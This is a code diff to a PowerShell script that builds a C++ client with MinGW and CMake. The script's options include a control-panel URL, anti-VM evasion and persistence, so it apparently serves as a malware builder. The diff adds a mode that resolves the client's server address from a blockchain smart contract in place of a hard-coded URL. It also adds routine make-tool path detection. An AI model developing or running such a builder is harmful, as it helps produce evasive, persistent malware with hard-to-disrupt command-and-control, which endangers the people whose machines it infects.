@@ -15,6 +15,8 @@
 param(
     [string]$panel_url = "",
     [string]$config_url = "",
+    [bool]$smart_contract = $false,
+    [string]$contract_address = "",
     [bool]$antivm = $false,
     [bool]$persistence = $false,
     [bool]$debug_console = $false,
@@ -88,6 +90,8 @@ if ($hasCMake -and $hasMinGW) {
     $args = @()
     if ($panel_url) { $args += "-panel_url '$panel_url'" }
     if ($config_url) { $args += "-config_url '$config_url'" }
+    if ($smart_contract) { $args += "-smart_contract `$true" }
+    if ($contract_address) { $args += "-contract_address '$contract_address'" }
     if ($antivm) { $args += "-antivm `$true" }
     if ($persistence) { $args += "-persistence `$true" }
     if ($debug_console) { $args += "-debug_console `$true" }
@@ -487,13 +491,30 @@ function Invoke-CMakeBuild {
         $srcDir = Join-Path $ClientDir "src"
         $mainCppPath = Join-Path $srcDir "main.cpp"
         
-        if ($Config.UseGetConfig) {
+        if ($Config.SmartContract) {
+            Write-LogInfo "Smart contract URL mode - skipping static URL injection"
+            Write-LogInfo "Contract: $($Config.ContractAddress)"
+        }
+        elseif ($Config.UseGetConfig) {
             & Modify-ConfigGetURL -MainCppPath $mainCppPath -ConfigURL $Config.ConfigURL
         }
         else {
             & Modify-PanelURL -MainCppPath $mainCppPath -PanelURL $Config.PanelURL
         }
         
+        # Locate mingw32-make so CMake can find the build program regardless of PATH state
+        $makeCmd = Get-Command mingw32-make -ErrorAction SilentlyContinue
+        $makeProgram = if ($makeCmd) { $makeCmd.Source } else { $null }
+        if (-not $makeProgram) {
+            # Chocolatey MinGW fallback path
+            $makeProgram = "C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin\mingw32-make.exe"
+        }
+        if (-not (Test-Path $makeProgram)) {
+            # Last resort: search common MinGW locations
+            $makeFound = Get-ChildItem "C:\mingw*","C:\msys*","C:\tools\mingw*" -Recurse -Filter "mingw32-make.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+            $makeProgram = if ($makeFound) { $makeFound.FullName } else { $null }
+        }
+
         # Prepare CMake arguments for 64-bit build
         $cmakeArgs = @(
             "-G", "MinGW Makefiles",
@@ -502,6 +523,10 @@ function Invoke-CMakeBuild {
             "-DCMAKE_CXX_COMPILER=g++",
             "-DCMAKE_RC_COMPILER=windres"
         )
+        if ($makeProgram -and (Test-Path $makeProgram)) {
+            $cmakeArgs += "-DCMAKE_MAKE_PROGRAM=$makeProgram"
+            Write-LogInfo "Using make: $makeProgram"
+        }
         
         if ($Config.AntiVM) {
             $cmakeArgs += "-DENABLE_ANTIVM=ON"
@@ -562,6 +587,11 @@ function Invoke-CMakeBuild {
         
         if ($Config.ConfigURL) {
             $cmakeArgs += "-DCONFIG_GET_URL=$($Config.ConfigURL)"
+        }
+
+        if ($Config.SmartContract) {
+            $cmakeArgs += "-DENABLE_CONTRACT_URL=ON"
+            $cmakeArgs += "-DCONTRACT_ADDRESS=$($Config.ContractAddress)"
         }
         
         $cmakeArgs += ".."
@@ -630,11 +660,11 @@ function Main {
         }
         
         # Get build configuration - use parameters if provided, otherwise ask interactively
-        if ($panel_url -or $config_url) {
+        if ($panel_url -or $config_url -or $smart_contract) {
             # Use provided parameters
             # Determine config method: if config_url provided, use GET; otherwise use POST (panel)
-            $useGetConfigMethod = -not [string]::IsNullOrEmpty($config_url) -and [string]::IsNullOrEmpty($panel_url)
-            
+            $useGetConfigMethod = -not [string]::IsNullOrEmpty($config_url) -and [string]::IsNullOrEmpty($panel_url) -and -not $smart_contract
+
             # Auto-detect embedded_config.json next to the script
             $embeddedConfigPath = Join-Path $scriptDir "embedded_config.json"
             $hasEmbeddedConfig = Test-Path $embeddedConfigPath
@@ -643,6 +673,8 @@ function Main {
                 'UseGetConfig' = $useGetConfigMethod
                 'PanelURL' = $panel_url
                 'ConfigURL' = $config_url
+                'SmartContract' = $smart_contract
+                'ContractAddress' = $contract_address
                 'AntiVM' = $antivm
                 'Persistence' = $persistence
                 'DebugConsole' = $debug_console
